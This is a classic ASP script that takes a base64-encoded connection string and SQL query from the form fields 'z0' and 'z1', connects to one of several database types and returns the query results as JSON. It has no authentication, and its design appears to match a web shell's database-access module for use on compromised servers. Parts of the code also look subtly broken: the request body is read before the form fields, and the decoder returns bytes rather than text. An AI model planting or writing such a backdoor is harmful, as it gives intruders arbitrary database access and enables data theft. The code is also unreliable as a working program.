<%
Response.Buffer = True
Response.ContentType = "application/json"

Function Base64Decode(str)
    Dim xml, node
    Set xml = Server.CreateObject("MSXML2.DOMDocument.3.0")
    Set node = xml.createElement("b64")
    node.dataType = "bin.base64"
    node.text = str
    Base64Decode = node.nodeTypedValue
    Set node = Nothing
    Set xml = Nothing
End Function

Function GetText()
    Dim stream
    Set stream = Server.CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write Request.BinaryRead(Request.TotalBytes)
    stream.Position = 0
    stream.Type = 2
    stream.Charset = "utf-8"
    GetText = stream.ReadText
    stream.Close
    Set stream = Nothing
End Function

Function ParseDSN(url)
    Dim p, parts, result, i, item, kv

    Set result = Server.CreateObject("Scripting.Dictionary")

    If InStr(url, "://") = 0 Then
        Err.Raise 1, "", "Invalid DSN format"
    End If

    p = Split(url, "://")
    result.Add "driver", LCase(p(0))

    If UBound(p) < 1 Then
        Err.Raise 1, "", "Invalid DSN format"
    End If

    Dim rest
    rest = p(1)

    ' server style parsing
    If result("driver") <> "sqlite" And result("driver") <> "access" Then

        Dim atPos
        atPos = InStr(rest, "@")

        Dim userpass, hostpart

        userpass = Left(rest, atPos - 1)
        hostpart = Mid(rest, atPos + 1)

        Dim up
        up = Split(userpass, ":")

        If UBound(up) >= 0 Then result.Add "user", up(0)
        If UBound(up) >= 1 Then result.Add "password", up(1)

        Dim hp, db
        hp = Split(hostpart, "/")

        Dim hostport
        hostport = Split(hp(0), ":")

        result.Add "host", hostport(0)
        If UBound(hostport) >= 1 Then result.Add "port", hostport(1)

        If UBound(hp) >= 1 Then
            result.Add "database", hp(1)
        End If

    Else
        result.Add "database", rest
    End If

    Set ParseDSN = result
End Function

Function ExecuteQuery(conn, sql)
    Dim rs
    Set rs = conn.Execute(sql)

    Dim output, i

    output = "{""success"":true,""rowCount"":" & rs.RecordCount & ",""data"":["

    If Not rs.EOF Then
        Do Until rs.EOF
            output = output & "{"

            For i = 0 To rs.Fields.Count - 1
                output = output & """" & rs.Fields(i).Name & """:"""
                output = output & Replace(rs.Fields(i).Value & "", """", "\""") & """"

                If i < rs.Fields.Count - 1 Then output = output & ","
            Next

            output = output & "},"
            rs.MoveNext
        Loop

        If Right(output, 1) = "," Then output = Left(output, Len(output) - 1)
    End If

    output = output & "]}"
    ExecuteQuery = output
End Function

Dim body, dsn_url, sql

body = GetText()

dsn_url = Base64Decode(Request.Form("z0"))
sql = Base64Decode(Request.Form("z1"))

On Error Resume Next

Dim cfg, connStr, conn, driver

Set cfg = ParseDSN(dsn_url)
driver = LCase(cfg("driver"))

Set conn = Server.CreateObject("ADODB.Connection")

Select Case driver

    Case "mysql"
        connStr = "Driver={MySQL ODBC 8.0 Driver};Server=" & cfg("host") & ";Database=" & cfg("database") & ";User=" & cfg("user") & ";Password=" & cfg("password") & ";"

    Case "pgsql"
        connStr = "Driver={PostgreSQL Unicode};Server=" & cfg("host") & ";Port=" & cfg("port") & ";Database=" & cfg("database") & ";Uid=" & cfg("user") & ";Pwd=" & cfg("password") & ";"

    Case "sqlsrv"
        connStr = "Provider=SQLOLEDB;Data Source=" & cfg("host") & ";" & _
                  "Initial Catalog=" & cfg("database") & ";" & _
                  "User ID=" & cfg("user") & ";Password=" & cfg("password") & ";"

    Case "sqlite"
        connStr = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & cfg("database") & ";"

    Case "access"
        connStr = "Provider=Microsoft.ACE.OLEDB.12.0;Data Source=" & cfg("database") & ";"

    Case "oracle"
        connStr = "Provider=OraOLEDB.Oracle;Data Source=" & cfg("host") & ":" & cfg("port") & "/" & cfg("database") & ";User Id=" & cfg("user") & ";Password=" & cfg("password") & ";"

    Case Else
        Response.Write "{""success"":false,""error"":""Unsupported database type""}"
        Response.End
End Select

conn.Open connStr

If Err.Number <> 0 Then
    Response.Write "{""success"":false,""error"":""" & Err.Description & """}"
    Response.End
End If

If sql = "" Then
    Response.Write "{""success"":true,""message"":""Database connection is OK""}"
    Response.End
End If

Response.Write ExecuteQuery(conn, sql)

conn.Close
Set conn = Nothing

On Error GoTo 0
%>